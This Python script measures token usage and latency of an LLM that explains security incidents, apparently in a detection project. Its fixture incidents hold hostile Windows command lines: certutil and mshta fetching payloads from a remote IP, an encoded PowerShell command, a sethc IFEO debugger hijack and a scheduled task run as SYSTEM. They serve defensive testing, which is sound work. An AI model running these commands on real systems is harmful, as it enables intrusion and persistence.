"""Day 12 (Pair 2) measurement tool: token usage + response time per explanation.

Roadmap task (docs/02_NightOwl_Handbook_Vol2_Roadmap.md, Phase 2 / Day 12):
"measure token usage and response time per explanation, document."

Unlike scripts/hallucination_spot_check.py (Day 10), this doesn't need the
real ingest -> detect -> group -> severity pipeline or Postgres -- it's
purely measuring the RAG explain call's cost/latency, so it uses crafted
incident dicts directly (same shape/precedent as the `if __name__ ==
"__main__"` blocks in rag/explain_service.py and rag/llm_client.py) against
the real, already-populated Chroma knowledge base (ai/vector_store/, built by
Day 4's ai/tools/build_kb.py -- no server process, PersistentClient reads it
directly) and a real LLM provider call via generate_with_metrics().

Measures 5 incidents (a mix of playbook-covered and playbook-gap
techniques per docs/research/hallucination-eval.md finding #3) x 2 calls
each (draft + critique, mirroring rag/explain_service.generate_explanation's
real shape) = 10 requests, half of Gemini's 20 req/day free-tier cap.

**Provider note:** run against **Groq** if available (`LLM_PROVIDER=groq`
in .env) to avoid competing with Gemini's tight 20 req/day cap for other
manual testing -- same reasoning as the Day 10 hallucination spot-check.

Run for real from backend/ (requires a real LLM key -- see .env's
LLM_PROVIDER/LLM_API_KEY/GROQ_API_KEY -- no Postgres/Docker needed):
    ./venv/Scripts/python.exe scripts/llm_cost_latency_check.py

Writes full per-call data to scripts/llm_cost_latency_output.json for
reference while writing docs/llm-cost-latency.md.
"""

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "backend"))  # <repo>/backend

from app.rag.llm_client import generate_with_metrics  # noqa: E402
from app.rag.prompts import build_critique_prompt, build_explanation_prompt  # noqa: E402
from app.rag.retriever import retrieve  # noqa: E402

_RETRIEVAL_K = 5

# 5 crafted incidents -- a mix of playbook-covered (T1059.001, T1053.005)
# and playbook-gap (T1105, T1546.012, T1218.005) techniques per
# docs/research/hallucination-eval.md's finding #3, so the measured token
# counts reflect both regimes. Same ground-truth command lines as the Day
# 10 hallucination spot-check's SPOT_CHECK_CASES, trimmed to 5.
COST_CHECK_INCIDENTS = [
    {
        "host": "COSTCHECK-01",
        "description": "Suspicious Encoded PowerShell Command",
        "severity": "high",
        "process": "powershell.exe",
        "command_line": "powershell.exe -enc JABzAD0AJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADUAJwA=",
        "user": "COSTCHECK-01\\jdoe",
        "technique_id": "T1059.001",
    },
    {
        "host": "COSTCHECK-02",
        "description": "Certutil Download via urlcache/split Flags",
        "severity": "high",
        "process": "certutil.exe",
        "command_line": r"certutil.exe -urlcache -split -f http://185.220.101.5/payload.exe C:\Users\Public\payload.exe",
        "user": "COSTCHECK-02\\jdoe",
        "technique_id": "T1105",
    },
    {
        "host": "COSTCHECK-03",
        "description": "Registry IFEO Debugger Hijack",
        "severity": "critical",
        "process": "cmd.exe",
        "command_line": r"reg.exe add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe /v Debugger /d C:\Windows\System32\cmd.exe",
        "user": "COSTCHECK-03\\jdoe",
        "technique_id": "T1546.012",
    },
    {
        "host": "COSTCHECK-04",
        "description": "Scheduled Task Creation via schtasks.exe",
        "severity": "medium",
        "process": "schtasks.exe",
        "command_line": r"schtasks.exe /create /tn Updater /tr C:\Users\Public\update.exe /sc onlogon /ru SYSTEM",
        "user": "COSTCHECK-04\\jdoe",
        "technique_id": "T1053.005",
    },
    {
        "host": "COSTCHECK-05",
        "description": "Suspicious Mshta Execution",
        "severity": "high",
        "process": "mshta.exe",
        "command_line": "mshta.exe http://185.220.101.5/payload.hta",
        "user": "COSTCHECK-05\\jdoe",
        "technique_id": "T1218.005",
    },
]


def _measure_one(incident: dict) -> dict:
    """Real retrieve -> draft -> critique, same shape as
    explain_service.generate_explanation, but using generate_with_metrics()
    so each call's tokens/latency are captured."""
    parts = [incident.get("technique_id"), incident.get("process"), incident.get("command_line"), incident.get("description")]
    query = " ".join(str(p) for p in parts if p)
    chunks = retrieve(query, k=_RETRIEVAL_K, technique_id=incident.get("technique_id"))

    draft_metrics = generate_with_metrics(build_explanation_prompt(incident, chunks))
    critique_metrics = generate_with_metrics(
        build_critique_prompt(draft_metrics.text, chunks, incident)
    )

    def _as_dict(m):
        return {
            "input_tokens": m.input_tokens,
            "output_tokens": m.output_tokens,
            "total_tokens": m.total_tokens,
            "latency_seconds": round(m.latency_seconds, 3),
            "provider": m.provider,
            "model": m.model,
        }

    return {
        "host": incident["host"],
        "technique_id": incident.get("technique_id"),
        "n_chunks_retrieved": len(chunks),
        "draft": _as_dict(draft_metrics),
        "critique": _as_dict(critique_metrics),
    }


def main() -> None:
    results = []
    for incident in COST_CHECK_INCIDENTS:
        print(f"Measuring {incident['host']} ({incident['technique_id']}) ...")
        try:
            entry = _measure_one(incident)
            results.append(entry)
            print(f"  OK: draft={entry['draft']}")
            print(f"      critique={entry['critique']}")
        except Exception as exc:  # noqa: BLE001 -- record any failure, keep going
            print(f"  FAILED: {type(exc).__name__}: {exc}")

    def _sum(field: str, section: str) -> int:
        values = [r[section][field] for r in results if r[section][field] is not None]
        return sum(values) if values else 0

    def _avg(field: str, section: str) -> float:
        values = [r[section][field] for r in results if r[section][field] is not None]
        return round(sum(values) / len(values), 3) if values else 0.0

    summary = {
        "n_explanations": len(results),
        "total_tokens_all_calls": _sum("total_tokens", "draft") + _sum("total_tokens", "critique"),
        "avg_draft_input_tokens": _avg("input_tokens", "draft"),
        "avg_draft_output_tokens": _avg("output_tokens", "draft"),
        "avg_critique_input_tokens": _avg("input_tokens", "critique"),
        "avg_critique_output_tokens": _avg("output_tokens", "critique"),
        "avg_draft_latency_seconds": _avg("latency_seconds", "draft"),
        "avg_critique_latency_seconds": _avg("latency_seconds", "critique"),
        "avg_total_latency_seconds_per_explanation": round(
            _avg("latency_seconds", "draft") + _avg("latency_seconds", "critique"), 3
        ),
    }
    print("\n--- Summary ---")
    print(json.dumps(summary, indent=2))

    out_path = Path(__file__).resolve().parent / "llm_cost_latency_output.json"
    out_path.write_text(
        json.dumps({"results": results, "summary": summary}, indent=2, ensure_ascii=False),
        encoding="utf-8",
    )
    print(f"\nWrote full output to {out_path}")


if __name__ == "__main__":
    main()
